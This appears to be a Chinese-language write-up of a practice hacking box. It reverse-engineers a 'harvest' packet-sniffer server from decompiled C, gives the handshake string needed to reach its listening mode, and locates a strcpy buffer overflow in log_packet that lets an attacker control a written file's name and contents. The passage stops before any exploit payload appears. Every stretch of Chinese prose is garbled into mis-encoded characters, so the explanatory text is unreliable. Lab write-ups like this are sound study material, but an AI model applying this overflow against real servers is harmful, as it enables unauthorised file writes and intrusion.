<p>è¿™é‡Œharveståˆ†ä¸ºserverå’Œcliï¼Œæ‰€ä»¥æˆ‘çš„æ€è·¯æ˜¯alexå¼€ç€serverï¼Œæ‰€ä»¥å®¡è®¡é‡ç‚¹åº”è¯¥æ˜¯åœ¨serveréƒ¨åˆ†ã€‚</p>
<p><img src="/wpimages/2024/magicgardens/web24.jpg" alt="web24"></p>
<p>è¿™é‡Œæ£€æµ‹<code>s1</code>ç³»ä¸ç³»<code>server</code>,ä¸€çœ¼<code>arg</code>ç»™<code>server</code>ï¼Œæ‰€ä»¥è¿™ä¸ªå°±æ˜¯<code>server</code>å…¥å£</p>
<p>æ¥ç€å°±åˆ°äº†<code>harvest_listen</code>ç›‘å¬æ–¹æ³•</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">harvest_listen</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, __int64 a2, <span class="type">const</span> <span class="type">char</span> *a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> optval; <span class="comment">// [rsp+30h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> raw_socket; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  fd = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  raw_socket = create_raw_socket(a3);</span><br><span class="line">  optval = <span class="number">1</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Socket creation failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( setsockopt(fd, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Failed to reuse address option&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v9;</span><br><span class="line">  BYTE1(v4) = BYTE1(v9) | <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">if</span> ( fcntl(fd, <span class="number">2</span>, v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] fcntl server error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  addr = <span class="number">0LL</span>;</span><br><span class="line">  addr.sa_family = <span class="number">2</span>;</span><br><span class="line">  *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = htonl(<span class="number">0</span>);</span><br><span class="line">  *(_WORD *)addr.sa_data = htons(a1);</span><br><span class="line">  <span class="keyword">if</span> ( bind(fd, &amp;addr, <span class="number">0x10</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Bind failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( listen(fd, <span class="number">5</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[x] Listen on port %d failed\n&quot;</span>, a1);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Listening on interface %s\n&quot;</span>, a3);</span><br><span class="line">  handle_connections((<span class="type">unsigned</span> <span class="type">int</span>)fd, raw_socket, a2, a4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>éœ€è¦å…³æ³¨<code>handle_connections((unsigned int)fd, raw_socket, a2, a4)</code>æ–¹æ³•ï¼Œå› ä¸ºä¸Šé¢éƒ½æ˜¯åˆå§‹åŒ–å•¥çš„ï¼Œå› ä¸ºä»–æœåŠ¡ç«¯é‚£è¾¹éƒ½è·‘èµ·æ¥äº†æ‰€ä»¥æš‚æ—¶å…ˆè¿‡æ‰ã€‚</p>
<p>è¿™ä¸ªæ–¹æ³•æ˜¯ç›‘å¬è¿æ¥çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; ; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( m &gt; v20 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    <span class="keyword">if</span> ( (readfds.fds_bits[m / <span class="number">64</span>] &amp; (<span class="number">1LL</span> &lt;&lt; (m &amp; <span class="number">0x3F</span>))) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( m == a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = accept(a1, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v11 &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[x] Failed to accept connection&quot;</span>);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)harvest_handshake_server((<span class="type">unsigned</span> <span class="type">int</span>)v11, a3) ) <span class="comment">//&lt;--åˆ¤æ–­æœåŠ¡ä¾§è¿æ¥ç›‘å¬å¯¹è±¡æƒ…å†µ</span></span><br><span class="line">        &#123;</span><br><span class="line">          v4 = v15;</span><br><span class="line">          BYTE1(v4) = BYTE1(v15) | <span class="number">8</span>;</span><br><span class="line">          <span class="keyword">if</span> ( fcntl(v11, <span class="number">2</span>, v4) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] fcntl client error&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          v9[v11 / <span class="number">64</span>] |= <span class="number">1LL</span> &lt;&lt; (v11 &amp; <span class="number">0x3F</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v11 &gt; v20 )</span><br><span class="line">            v20 = v11;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( m == a2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">        handle_raw_packets((<span class="type">unsigned</span> <span class="type">int</span>)m, s, a4); <span class="comment">//&lt;--åœ¨m==a2 ä¹Ÿå°±æ˜¯æœåŠ¡è¿æ¥åˆ°äº†ç›‘å¬å¯¹è±¡åï¼Œå¯¹ç›‘å¬åˆ°çš„åŒ…è¿›è¡Œå¤„ç†</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (v9[m / <span class="number">64</span>] &amp; (<span class="number">1LL</span> &lt;&lt; (m &amp; <span class="number">0x3F</span>))) != <span class="number">0</span> )</span><br><span class="line">      handle_client((<span class="type">unsigned</span> <span class="type">int</span>)m, v9, (<span class="type">unsigned</span> <span class="type">int</span>)v20, s); <span class="comment">//&lt;--å®¢æˆ·ç«¯ä¾§å¤„ç†</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå…¶å®æˆ‘å¡äº†ä¸€å¤©å¤šï¼Œä¸»è¦æ‰¾ä¸åˆ°åˆ©ç”¨ç‚¹ï¼Œç„¶åæœ‹å‹è¯´å…ˆç”¨<code>harvest_handshake_server</code>æ–¹æ³•è®©å®ƒè¿›ç›‘å¬æ¨¡å¼åé¢æ‰æœ‰å¾—æã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">harvest_handshake_server</span><span class="params">(<span class="type">int</span> a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-40h] BYREF</span></span><br><span class="line">  __int128 v7; <span class="comment">// [rsp+60h] [rbp-30h]</span></span><br><span class="line">  __int128 v8; <span class="comment">// [rsp+70h] [rbp-20h]</span></span><br><span class="line">  __int128 v9; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(a1, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  *(_OWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(s, <span class="string">&quot;harvest v&quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;s[v2], a2);</span><br><span class="line">  *(_WORD *)&amp;s[<span class="built_in">strlen</span>(s)] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">    write(a1, s, v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Successful handshake&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Handshake error&quot;</span>);</span><br><span class="line">    write(a1, <span class="string">&quot;[x] Handshake error\n&quot;</span>, <span class="number">0x15</span>uLL);</span><br><span class="line">    close(a1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶å®é‡ç‚¹çš„å°±ä¸‹é¢è¿™æ®µ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Â·Â·Â·</span><br><span class="line">  strcpy(s, &quot;harvest v&quot;);</span><br><span class="line">  v2 = strlen(s);</span><br><span class="line">  strcpy(&amp;s[v2], a2);</span><br><span class="line">  *(_WORD *)&amp;s[strlen(s)] = 10;</span><br><span class="line">  if ( !strcmp(s, buf) )</span><br><span class="line">Â·Â·Â·</span><br></pre></td></tr></table></figure>
<p>è¦<code>buf</code>å’Œ<code>s</code>çš„å€¼ä¸€è‡´æ‰å¯ä»¥ï¼Œå¯ä»¥çœ‹åˆ°<code>s</code>ä¸€å¼€å§‹è¢«èµ‹å€¼äº†<code>harvest v</code>ï¼Œæ‰€ä»¥æ¯”è¾ƒç®€å•çš„æ–¹å¼è¿˜æ˜¯å‘ä¸ªåŒ…ç„¶ådebug..</p>
<p><img src="/wpimages/2024/magicgardens/pwn1.jpg" alt="pwn1"></p>
<p>äºæ˜¯ä¸‹ä¸ªæ–­ç‚¹çœ‹çœ‹ï¼Œæˆ‘é€‰åœ¨è¿™é‡Œï¼Œå› ä¸ºçœ‹åˆ°ä»–æœ‰ç»™sæœ€åˆçš„<code>harvest v</code>ï¼Œæ‰€ä»¥è·Ÿç€å¾€ä¸‹èµ°èµ°çœ‹cmpé‚£ä¼šå˜æˆå•¥ã€‚</p>
<p><img src="/wpimages/2024/magicgardens/pwn2.jpg" alt="pwn2"></p>
<p>å¾€ä¸‹è·Ÿäº†è·Ÿåˆ°äº†strcmpï¼Œå› ä¸ºæˆ‘ç”¨çš„å®¢æˆ·ç«¯è¿æ¥çš„å˜› æ‰€ä»¥è¿™ä¸ªéƒ¨åˆ†å°±<code>1.0.3</code>è‚¯å®šæ˜¯å®¢æˆ·ç«¯å‘è¿‡å»çš„äº†ï¼Œæ‰€ä»¥éªŒè¯æ˜¯æŒ‡å®šèƒ½è¿‡å¾—ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ„é€ çš„å‘é€åŒ…è¦å¸¦ç€harvest v1.0.3ï¼Œä»¥é˜²ä¸‡ä¸€å†æŠ“äº†ä¸ªåŒ…çœ‹çœ‹</p>
<p><img src="/wpimages/2024/magicgardens/net1.jpg" alt="net1"></p>
<p>å¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯å‘äº†ä¸ªè¿™ä¸ªç©æ„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ echo &#x27;harvest v1.0.3&#x27;|nc 127.0.0.1 1337</span><br><span class="line">harvest v1.0.3</span><br><span class="line">--------------------------------------------------</span><br><span class="line">Source: [00:0c:29:b9:eb:93]     [192.168.221.131]</span><br><span class="line">Dest:   [00:50:56:c0:00:08]     [192.168.221.1]</span><br><span class="line">Time:   [07:45:52]      Length: [86]</span><br></pre></td></tr></table></figure>

<p>æœ‹å‹è®©ç”¨ncè¿æ¥å‘åŒ…è¯•è¯•ï¼Œç¡®å®è¡Œã€‚</p>
<p><img src="/wpimages/2024/magicgardens/pwn3.jpg" alt="pwn3"></p>
<p>é¡ºä¾¿çœ‹ä¸‹ä¸‹é¢çš„mä¼šå˜æˆä»€ä¹ˆï¼Œæ–­ç‚¹ä¸‹åˆ°è¿™é‡Œå¥½äº†</p>
<p><img src="/wpimages/2024/magicgardens/pwn4.jpg" alt="pwn4"></p>
<p>åœ¨ç»è¿‡å‡ æ¬¡å¾ªç¯åè¿™é‡Œcmpæ—¶å€™å°±æ˜¯ä¸€æ ·çš„0x4äº†,ç„¶åå°±è¿›äº†<code>handle_raw_packets</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">handle_raw_packets</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">10</span>]; <span class="comment">// [rsp+2Eh] [rbp-10072h] BYREF</span></span><br><span class="line">  <span class="type">time_t</span> timer; <span class="comment">// [rsp+38h] [rbp-10068h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">32</span>]; <span class="comment">// [rsp+40h] [rbp-10060h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">32</span>]; <span class="comment">// [rsp+60h] [rbp-10040h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">14</span>]; <span class="comment">// [rsp+80h] [rbp-10020h] BYREF</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+8Eh] [rbp-10012h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+1008Ch] [rbp-14h]</span></span><br><span class="line">  __int16 *v13; <span class="comment">// [rsp+10090h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// [rsp+1009Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0xFFFF</span>uLL);</span><br><span class="line">  v14 = recvfrom(a1, s, <span class="number">0xFFFF</span>uLL, <span class="number">0</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  timer = time(<span class="number">0LL</span>);</span><br><span class="line">  v3 = ctime(&amp;timer);</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, v3 + <span class="number">11</span>, <span class="number">8uLL</span>);</span><br><span class="line">  dest[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v14 &lt;= <span class="number">0x27</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incomplete packet &quot;</span>);</span><br><span class="line">    close(a1);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = &amp;v11;</span><br><span class="line">  v12 = <span class="number">255</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(</span><br><span class="line">    v9,</span><br><span class="line">    <span class="string">&quot;%.2x:%.2x:%.2x:%.2x:%.2x:%.2x&quot;</span>,</span><br><span class="line">    (<span class="type">unsigned</span> __int8)s[<span class="number">6</span>],</span><br><span class="line">    (<span class="type">unsigned</span> __int8)s[<span class="number">7</span>],</span><br><span class="line">    (<span class="type">unsigned</span> __int8)s[<span class="number">8</span>],</span><br><span class="line">    (<span class="type">unsigned</span> __int8)s[<span class="number">9</span>],</span><br><span class="line">    (<span class="type">unsigned</span> __int8)s[<span class="number">10</span>],</span><br><span class="line">    (<span class="type">unsigned</span> __int8)s[<span class="number">11</span>]);</span><br><span class="line">  <span class="built_in">sprintf</span>(</span><br><span class="line">    v8,</span><br><span class="line">    <span class="string">&quot;%.2x:%.2x:%.2x:%.2x:%.2x:%.2x&quot;</span>,</span><br><span class="line">    v12 &amp; (<span class="type">unsigned</span> <span class="type">int</span>)s[<span class="number">0</span>],</span><br><span class="line">    v12 &amp; (<span class="type">unsigned</span> <span class="type">int</span>)s[<span class="number">1</span>],</span><br><span class="line">    v12 &amp; (<span class="type">unsigned</span> <span class="type">int</span>)s[<span class="number">2</span>],</span><br><span class="line">    v12 &amp; (<span class="type">unsigned</span> <span class="type">int</span>)s[<span class="number">3</span>],</span><br><span class="line">    v12 &amp; (<span class="type">unsigned</span> <span class="type">int</span>)s[<span class="number">4</span>],</span><br><span class="line">    v12 &amp; (<span class="type">unsigned</span> <span class="type">int</span>)s[<span class="number">5</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)v13 == <span class="number">69</span> )</span><br><span class="line">    print_packet((_DWORD)v13, a3, a2, (<span class="type">unsigned</span> <span class="type">int</span>)v9, (<span class="type">unsigned</span> <span class="type">int</span>)v8, (<span class="type">unsigned</span> <span class="type">int</span>)dest, (__int64)s);</span><br><span class="line">  result = *(<span class="type">unsigned</span> __int8 *)v13;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">96</span> )</span><br><span class="line">    <span class="keyword">return</span> log_packet(v13, a3);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2024/magicgardens/pwn5.jpg" alt="pwn5"></p>
<p>ç„¶åæˆ‘å°±çœ‹è§å®ƒè¿›æ¥ç»™å‡ ä¸ªå‚ç”³è¯·äº†å¥½å¤§ä¸€æ®µç©ºé—´..</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Â·Â·Â·</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)v13 == <span class="number">0x45</span> )</span><br><span class="line">    print_packet((_DWORD)v13, a3, a2, (<span class="type">unsigned</span> <span class="type">int</span>)v9, (<span class="type">unsigned</span> <span class="type">int</span>)v8, (<span class="type">unsigned</span> <span class="type">int</span>)dest, (__int64)s);</span><br><span class="line">  result = *(<span class="type">unsigned</span> __int8 *)v13;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">0x60</span> )</span><br><span class="line">    <span class="keyword">return</span> log_packet(v13, a3);</span><br><span class="line">Â·Â·Â·</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€æ®µå…¶å®æ˜¯åˆ¤æ–­åŒ…å¤´ä¿¡æ¯ï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œç”¨çš„æ˜¯ipv4çš„åœ°å€è¿æ¥ï¼Œå®ƒçš„åŒ…å¤´å°±ä¼šæœ‰69ï¼Œæ¯”å¦‚</p>
<p><img src="/wpimages/2024/magicgardens/net2.jpg" alt="net2"></p>
<p>è¿™ä¸ªæ ·å­</p>
<p><img src="/wpimages/2024/magicgardens/net3.jpg" alt="net3"></p>
<p>è¿™ä¸ªæ˜¯ipv6</p>
<p>å…¶å®è¿™ä¸ªæº¢å‡ºç‚¹å°±æ˜¯å¯¹ipv6å¤„ç†è¿›å…¥åˆ°è¿™ä¸ªlog_packeté‡Œé¢å‘ç”Ÿçš„..</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">log_packet</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint16_t</span> v3; <span class="comment">// [rsp+1Eh] [rbp-FF82h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">65360</span>]; <span class="comment">// [rsp+20h] [rbp-FF80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">40</span>]; <span class="comment">// [rsp+FF70h] [rbp-30h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+FF98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = htons(*(_WORD *)(a1 + <span class="number">4</span>));</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, a2);  <span class="comment">//&lt;---è¿™é‡Œæº¢å‡ºäº† a2æ˜¯æˆ‘ä»¬ä¼ çš„ï¼Œå¯ä»¥è¶…å¤§</span></span><br><span class="line">    <span class="built_in">strncpy</span>(format, (<span class="type">const</span> <span class="type">char</span> *)(a1 + <span class="number">60</span>), v3);</span><br><span class="line">    *(_WORD *)&amp;format[v3] = <span class="number">10</span>;</span><br><span class="line">    stream = fopen(dest, <span class="string">&quot;w&quot;</span>); <span class="comment">//&lt;---è¿™é‡Œdestè¢«å†™å…¥äº†ï¼Œå¯ä»¥æº¢å‡ºæ§åˆ¶è¿™é‡Œçš„æ–‡ä»¶åï¼Œç”šè‡³æ˜¯å†…å®¹</span></span><br><span class="line">    <span class="keyword">if</span> ( stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(stream, format);</span><br><span class="line">      fclose(stream);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[!] Suspicious activity. Packages have been logged.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bad log file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çŸ¥é“äº†æº¢å‡ºç‚¹å°±å¯ä»¥ç‹ ç‹ å‡ºå‡»äº†ï¼Œç›´æ¥æ„é€ ä¸ªå¤§çš„å‘è¿‡å»ï¼Œéœ€è¦æ³¨æ„å¾—å…ˆè®©ä»–è¿›äº†ç›‘å¬æ¨¡å¼å†è·‘ã€‚</p>
